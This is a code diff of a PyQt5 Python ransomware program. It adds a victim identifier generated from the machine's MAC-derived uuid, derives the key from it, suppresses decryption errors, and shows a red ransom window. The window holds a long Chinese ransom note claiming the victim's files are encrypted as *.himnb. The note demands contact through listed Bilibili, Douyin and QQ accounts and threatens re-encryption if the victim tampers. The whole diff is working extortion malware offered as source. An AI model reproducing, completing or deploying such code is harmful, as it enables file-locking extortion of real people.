@@ -1,8 +1,13 @@
 from PyQt5 import QtCore, QtGui, QtWidgets
 import sys
 import os
+import uuid
 import random
 import ctypes
+
+
+bsf = abs(random.randint(-44351348748004,uuid.getnode()))
+pswd= str(hash(str(len(str(bsf))+73/9+bsf)))
 
 
 class cip:
@@ -28,7 +33,7 @@ class cip:
                     else:
                         raise ValueError("Invalid ciphertext format")
                 except ValueError:
-                    raise ValueError("Invalid ciphertext format")
+                    pass
             with open(self.file, 'wb') as file_write:
                 file_write.write(bytes(original_data))
             
@@ -37,7 +42,7 @@ class Ui_Form():
     def setupUi(self, Form):
         Form.setObjectName("Form")
         Form.resize(685, 505)
-        Form.setStyleSheet("background-color: rgb(212, 227, 224);\n"
+        Form.setStyleSheet("background-color: rgb(255, 0, 0);\n"
                            "color: rgb(0, 0, 0);")
 
         Form.setWindowFlags(QtCore.Qt.Window | QtCore.Qt.CustomizeWindowHint | QtCore.Qt.WindowTitleHint)
@@ -74,7 +79,7 @@ class Ui_Form():
         self.textBrowser.setGeometry(QtCore.QRect(30, 240, 181, 91))
         self.textBrowser.setStyleSheet("background-color: rgb(255, 255, 255);")
         self.textBrowser.setObjectName("textBrowser")
-        self.textBrowser.setText('ss')
+        self.textBrowser.setText(str(bsf))
 
         self.label_3 = QtWidgets.QLabel(Form)
         self.label_3.setGeometry(QtCore.QRect(30, 180, 181, 51))
@@ -92,7 +97,7 @@ class Ui_Form():
                                            "p, li { white-space: pre-wrap; }\n"
                                            "</style></head><body style=\" font-family:\'SimSun\'; font-size:9pt; font-weight:400; font-style:normal;\">\n"
                                            "<p align=\"center\" style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:12pt; font-weight:600;\">你的文件已经被我吃掉了，明天我拉出来给你</span></p>\n"
-                                           "<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:12pt;\">惊不惊喜！意不意外！你的文件已经被你爷爷我him加密了，想要回来？在b站联系我，搜Technology_him和我私信要密码，记得报上你的标识符，不然我可没办法给你解开哦！还有就是请勿将被我加密的文件(*.himnb)改回去，要不然我会再加密一次，你可就难以要回你文件了，看看我精心给你准备的桌面，你看看那早已成仙的那帅气的我，像不像你爹！总之想要回文件就得联系我，我要是心情好可能直接无偿给你密钥，我这人并不是很喜欢钱，所以大概率我不要钱，但是你需要取悦我，听从我的要求，否则我会让你吃不了兜着走！当然，除了b站你也可以在其他平台联系我，你要是找得到就行，找不到你吃屎去！</span></p>\n"
+                                           "<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:12pt;\">惊不惊喜！意不意外！你的文件已经被你爷爷我him加密了，想要回来？在b站联系我，搜Technology_him和我私信要密码，记得报上你的标识符，不然我可没办法给你解开哦！还有就是请勿将被我加密的文件(*.himnb)改回去，要不然我会再加密一次，你可就难以要回你文件了，看看我精心给你准备的桌面，你看看那早已成仙的那帅气的我，像不像你爹！总之想要回文件就得联系我，我要是心情好可能直接无偿给你密钥，我这人并不是很喜欢钱，所以大概率我不要钱，但是你需要取悦我，听从我的要求，否则我会让你吃不了兜着走！当然，除了b站你也可以在其他平台联系我，你要是找得到就行，找不到你吃屎去！不要想着解除此病毒，否则你就别要回你的文件了！</span></p>\n"
                                            "<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:12pt;\">b站：Technology_him</span></p>\n"
                                            "<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:12pt;\">抖音：szylbz.1314</span></p>\n"
                                            "<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:12pt;\">QQ：715387640（不稳定）</span></p>\n"
